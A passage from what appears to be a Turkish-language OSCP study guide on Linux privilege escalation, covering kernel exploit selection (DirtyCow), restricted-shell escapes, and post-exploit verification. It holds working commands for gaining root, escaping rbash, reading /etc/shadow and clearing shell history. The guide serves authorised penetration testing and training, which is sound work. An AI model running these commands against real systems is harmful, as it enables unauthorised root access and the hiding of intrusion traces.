./linux-exploit-suggester-2.pl -k <KERNEL_SURUMU>     # olası CVE listesi
# Derleme hedefi için:
lscpu                               # mimari
gcc --version 2>/dev/null || which cc tcc    # hedefte derleyici var mı
lsmod && /sbin/modinfo <modul>      # yüklü modül/sürücü sürümleri (3. party sürücü CVE'leri)
```

**Tuzaklar / notlar:**
- **DirtyCow sınıfı exploit'ler (CVE-2016-5195) race condition içerir; çalıştırma
  sistemi kararsız hale getirebilir.** Önce snapshotta/kopyada dene; canlı hedefte
  rootfs bozulabilir.
- Exploit'i kendi makinede derleyip (`gcc -static -o exp exp.c`, mimari uyumlu)
  hedefe at; hedefte derleyici yoksa bu tek yoldur. Bazı exploit'ler hedef
  kernel header'ı ister — o zaman kurban üzerinde derle.
- Container içindeysen kernel exploit genelde host'u etkilemez (paylaşılan kernel
  olsa bile cgroup/namespace sınırları devrededir); önce bölüm 10 kaçışlarını dene.

### 12.2 Genel sömürme akışı
```bash
# 1) Suggester çıktısından sürümle uyumlu exploit seç (ör. dirtycow.c)
# 2) Kaynağı incele — hardcoded path/payload'ı hedefe uyarla
# 3) Derle ve çalıştır
gcc -pthread dirty.c -o dirty -lcrypt     # örnek: -lcrypt gerekebilir
./dirty <PAROLA>                           # çoğu PoC fire-and-forget root verir
id                                        # uid=0 doğrulaması
```

**Tuzaklar / notlar:**
- PoC içindeki sabit kullanıcı adı/parola değerlerini değiştir; varsayılanlar
  host üzerinde iz bırakır ve bazı PoC'ler "temizlik" adı altında dosya siler.
- Başarısız exploit çekirdek paniği = reboot = engagement biter. Riski raporla.

---

## 13. Restricted shell ve kaçış teknikleri

### 13.1 rbash/rzsh/rksh kaçışları
**Ne / ne zaman:** Yetkili komut listesi kısıtlı shell'de (rbash) çalıştırılabiliyorsa;
komut ikamesi, zincirleme veya PATH oyunuyla sınırlar aşılır.

```bash
# Komut ikamesi: kısıtlı komut argüman olarak çalışmayan komutun çıktısını alır
ls -l `pwd`
ls -l $(id)

# Komut zincirleme: izinli komut + ; veya |
ls ; /bin/bash
ls | less        # less içinden !/bin/bash

# cat yoksa dosya okuma alternatifleri:
echo "$(< /home/<KULLANICI>/flag.txt)"
head -100 /path/file
```

**Tuzaklar / notlar:**
- Kaçış teknikleri GTFOBins "restricted shell" ve shell-escape sayfalarıyla genişler;
  izinli her komutu orada ara.
- Tmux/screen izinliyse yeni pencerede tam shell alınabilir (`cat /etc/shells` ile
  mevcut shell'leri gör).

---

## 14. Standart post-exploit doğrulama

**Ne / ne zaman:** Her teknik sonrası aynı kontrol seti; kanıt ve rapor için.

```bash
id && sudo -l                    # gerçekten root mu, sudo genişledi mi
whoami; hostname; uname -a       # rapor başlık bilgisi
cat /etc/shadow | head -3        # root yetki kanıtı (hash'leri raporda maskele!)
ls -l /tmp/bash 2>/dev/null      # bırakılan SUID artefakt
history -c 2>/dev/null; rm -f /tmp/x.so /tmp/root.c   # kendi artefakt temizliğin
```

**Tuzaklar / notlar:**
- Root shell kanıtı olarak **gerçek hash/parola/flag asla rapora ham halde girmez**;
  maskele (kullanım kurallarına bakın).
- SUID bash artefaktı (`/tmp/bash`) hedef üzerinde kalıcı izdir; engagement
  kuralları gerektiriyorsa temizle, gerektirmiyorsa not al.
- Cron/sudoers değişiklikleri yapıldıysa raporda "kalıcı değişiklik" olarak işaretle;
  yetki kaldırma adımlarını ayrıca ver.

{% endraw %}

---

[← Bölüm 4](/oscp/04-windows-privesc/) · [Bölüm 6 →](/oscp/06-ad-enumerasyon/)
